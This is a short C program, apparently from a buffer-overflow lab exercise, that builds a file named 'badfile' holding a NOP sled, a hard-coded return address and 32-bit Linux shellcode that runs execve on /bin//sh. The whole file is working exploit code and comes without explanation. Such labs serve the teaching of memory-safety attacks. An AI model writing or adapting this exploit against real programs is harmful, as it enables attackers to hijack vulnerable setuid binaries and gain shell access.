#include<stdlib.h>
#include<stdio.h>
#include<string.h>

char shellcode[]=
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
memset(&buffer, 0x90, 517);

*(buffer+36)=0x32;
*(buffer+37)=0xf2;
*(buffer+38)=0xff;
*(buffer+39)=0xbf;

int end=sizeof(buffer) - sizeof(shellcode);

int i;
for(i=0; i<sizeof(shellcode); i++)
buffer[end+i] = shellcode[i];

badfile=fopen("./badfile","w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}